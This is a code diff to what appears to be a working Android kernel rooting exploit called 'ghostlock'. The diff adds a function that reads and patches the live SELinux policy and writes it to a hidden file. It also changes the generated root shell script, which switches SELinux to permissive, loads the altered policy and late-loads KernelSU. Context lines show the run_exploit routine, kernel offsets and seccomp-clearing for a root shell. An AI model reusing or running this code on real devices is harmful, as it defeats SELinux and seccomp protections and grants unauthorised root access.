@@ -20,6 +20,7 @@ const struct kernel_offsets *active_offsets = NULL;
 
 static char g_home_dir[256] = "/data/local/tmp";
 static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
+static char g_root_policy_path[320] = "/data/local/tmp/.ghostlock_policy";
 
 /* MTK loads the kernel at the DRAM base (text_offset=0), Qualcomm via the
  * bootloader; the same uname -r can serve both families, so detect at
@@ -346,6 +347,92 @@ static int check_selinux_off(void) {
   return b[0] == '0';
 }
 
+static void fix_selinux_policy(void) {
+  /* 清理旧的策略文件和备份 */
+  if (unlink(g_root_policy_path) < 0 && errno != ENOENT) {
+    pr_info("fix_policy: unlink old policy file failed errno=%d\n", errno);
+  }
+
+  char bak_path[320];
+  snprintf(bak_path, sizeof(bak_path), "%s/.ghostlock_policy_bak", g_home_dir);
+  if (unlink(bak_path) < 0 && errno != ENOENT) {
+    pr_info("fix_policy: unlink old backup failed errno=%d\n", errno);
+  }
+
+  /* 读取原始策略 */
+  int rfd = open("/sys/fs/selinux/policy", O_RDONLY);
+  if (rfd < 0) { pr_info("fix_policy: open read failed errno=%d\n", errno); return; }
+  off_t sz = lseek(rfd, 0, SEEK_END);
+  if (sz <= 0) { close(rfd); return; }
+  lseek(rfd, 0, SEEK_SET);
+  uint8_t *buf = malloc(sz);
+  if (!buf) { close(rfd); return; }
+  ssize_t rd = read(rfd, buf, sz);
+  close(rfd);
+  if (rd != sz) { free(buf); return; }
+
+  /* 备份原始策略到 .ghostlock_policy_bak */
+  int bfd = open(bak_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+  if (bfd >= 0) {
+    ssize_t bw = write(bfd, buf, sz);
+    close(bfd);
+    pr_info("fix_policy: backup saved to %s %s (%zd/%zd bytes)\n",
+            bak_path, bw == sz ? "ok" : "FAILED", bw, (ssize_t)sz);
+  } else {
+    pr_info("fix_policy: backup failed errno=%d\n", errno);
+  }
+
+  /* 验证策略文件魔数 */
+  if (sz < 20 || buf[0] != 0x8c || buf[1] != 0xff || buf[2] != 0x7c || buf[3] != 0xf9) {
+    pr_info("fix_policy: bad magic\n");
+    free(buf); return;
+  }
+
+  /* 动态计算 config 偏移：offset = 12 + identifier_length */
+  uint32_t id_len;
+  memcpy(&id_len, buf + 4, 4);
+  size_t config_off = 12 + id_len;  /* 修正：12 = 魔数(4) + id长度(4) + 保留(4) */
+  if (config_off + 4 > (size_t)sz) { 
+    pr_info("fix_policy: config offset out of bounds\n");
+    free(buf); 
+    return; 
+  }
+
+  /* 读取原始 config，保留所有已有配置位 */
+  uint32_t original_config;
+  memcpy(&original_config, buf + config_off, 4);
+  
+  /* 只补回 Android Netlink 两个位：
+   * 0x80000000 = Android NETLINK_ROUTE / GETLINK
+   * 0x40000000 = Android NETLINK_GETNEIGH
+   */
+  uint32_t fixed = original_config | 0xC0000000U;
+  
+  if (fixed != original_config) {
+    memcpy(buf + config_off, &fixed, 4);
+    pr_info("fix_policy: config 0x%08x -> 0x%08x (offset 0x%zx)\n", 
+            original_config, fixed, config_off);
+  }
+
+  /* 将修复值写入临时副本文件 */
+  int wfd = open(g_root_policy_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+  if (wfd < 0) { 
+    pr_info("fix_policy2: open policy file failed errno=%d\n", errno); 
+    free(buf); 
+    return; 
+  }
+  ssize_t wr = write(wfd, buf, sz);
+  close(wfd);
+  free(buf);
+  
+  if (wr == sz) {
+    pr_info("fix_policy: saved to %s ok (%zd bytes)\n", g_root_policy_path, (ssize_t)sz);
+  } else {
+    pr_info("fix_policy: saved to %s FAILED (%zd/%zd bytes)\n", 
+            g_root_policy_path, wr, (ssize_t)sz);
+  }
+}
+
 static int enforce_readable(void) {
   int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
   if (efd < 0) return 0;
@@ -462,7 +549,10 @@ static void init_runtime_paths(void) {
   }
   snprintf(g_root_script_path, sizeof(g_root_script_path),
            "%s/.ghostlock_root.sh", g_home_dir);
-  pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
+  snprintf(g_root_policy_path, sizeof(g_root_policy_path),
+           "%s/.ghostlock_policy", g_home_dir);
+  pr_info("runtime home=%s script=%s policy=%s\n", g_home_dir, 
+          g_root_script_path, g_root_policy_path);
 }
 
 static void write_root_script(void) {
@@ -480,9 +570,40 @@ static void write_root_script(void) {
       "HOME_DIR='%s'\n"
       "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
       "KSUD=\"$HOME_DIR/ksud\"\n"
+      "POLICY_FILE='%s'\n"
       "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
       "chmod 644 \"$LOG\" 2>/dev/null\n"
       "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
+      "if [ \"$(id -u)\" -ne 0 ]; then\n"
+      "  echo '[!] temp su unavailable; aborting' | tee -a \"$LOG\"\n"
+      "  exit 1\n"
+      "fi\n"
+      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
+      "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
+      "echo \"[*] setenforce 0 rc=$?\" >>\"$LOG\"\n"
+      /* 先加载策略文件 */
+      "FIXUP_RC=1\n"
+      "for i in $(seq 1 10); do\n"
+      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
+      "  if [ -f \"$POLICY_FILE\" ]; then\n"
+      "    echo \"[*] loading policy from $POLICY_FILE\" >>\"$LOG\"\n"
+      "    timeout 8 load_policy \"$POLICY_FILE\" >>\"$LOG\" 2>&1\n"
+      "  else\n"
+      "    echo \"[*] policy file $POLICY_FILE not found, falling back to default\" >>\"$LOG\"\n"
+      "    echo \"[*] loading default policy from /sys/fs/selinux/policy\" >>\"$LOG\"\n"
+      "    timeout 8 load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1\n"
+      "  fi\n"
+      "  FIXUP_RC=$?\n"
+      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "    echo \"[+] load_policy succeeded on attempt $i\" >>\"$LOG\"\n"
+      "    break\n"
+      "  else\n"
+      "    echo \"[!] load_policy failed on attempt $i with rc=$FIXUP_RC\" >>\"$LOG\"\n"
+      "  fi\n"
+      "  sleep 2\n"
+      "done\n"
+      "echo \"[*] policy fixup final rc=$FIXUP_RC\" >>\"$LOG\"\n"
+      /* 然后进行 late-load */
       "if [ ! -x \"$KSUD\" ]; then\n"
       "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
       "fi\n"
@@ -493,11 +614,6 @@ static void write_root_script(void) {
       "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
       "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
       "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
-      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
-      "if [ \"$(id -u)\" -ne 0 ]; then\n"
-      "  echo '[!] temp su unavailable; aborting' | tee -a \"$LOG\"\n"
-      "  exit 1\n"
-      "fi\n"
       "if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
       "  if [ ! -x \"$KSUD\" ]; then\n"
       "    echo '[!] ksud missing; cannot late-load' | tee -a \"$LOG\"\n"
@@ -509,7 +625,7 @@ static void write_root_script(void) {
       "  KMI=\"${AVER}-${KVER}\"\n"
       "  if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then KMI=android15-6.6; fi\n"
       "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
-      "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
+      "  \"$KSUD\" late-load --kmi \"$KMI\" >>\"$LOG\" 2>&1\n"
       "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
       "fi\n"
       "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
@@ -519,31 +635,19 @@ static void write_root_script(void) {
       "  sleep 0.1\n"
       "done\n"
       "if [ \"$KSU_READY\" -ne 1 ]; then\n"
-      "  echo '[!] KernelSU module not loaded; SELinux policy/enforcing unchanged' | tee -a \"$LOG\"\n"
+      "  echo '[!] KernelSU module not loaded' | tee -a \"$LOG\"\n"
       "  exit 1\n"
       "fi\n"
       "echo '[+] KernelSU module loaded' | tee -a \"$LOG\"\n"
       "echo \"[*] kernelsu.ko loaded; root pid=$$ uid=$(id -u)\" >>\"$LOG\"\n"
-      "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
-      "echo \"[*] setenforce 0 rc=$?\" >>\"$LOG\"\n"
-      "FIXUP_RC=1\n"
-      "for i in $(seq 1 10); do\n"
-      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
-      "  timeout 8 load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1\n"
-      "  FIXUP_RC=$?\n"
-      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-      "    break\n"
-      "  fi\n"
-      "  sleep 2\n"
-      "done\n"
-      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
       "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
       "  echo \"[*] restoring enforcing\" >>\"$LOG\"\n"
       "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+      "  echo \"[*] setenforce 1 rc=$?\" >>\"$LOG\"\n"
       "else\n"
       "  echo '[!] fixup failed; SELinux left permissive' | tee -a \"$LOG\"\n"
       "fi\n",
-      g_home_dir);
+      g_home_dir, g_root_policy_path);
   if (n < 0 || n >= (int)sizeof(script)) {
     pr_warning("root script too long\n");
     close(sfd);
@@ -958,6 +1062,8 @@ int run_exploit(int argc, char **argv) {
       waitpid(child, NULL, 0);
       return 1;
     }
+
+    fix_selinux_policy();
 
     /* W3: clear the child's seccomp filter for the independent root shell
      * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
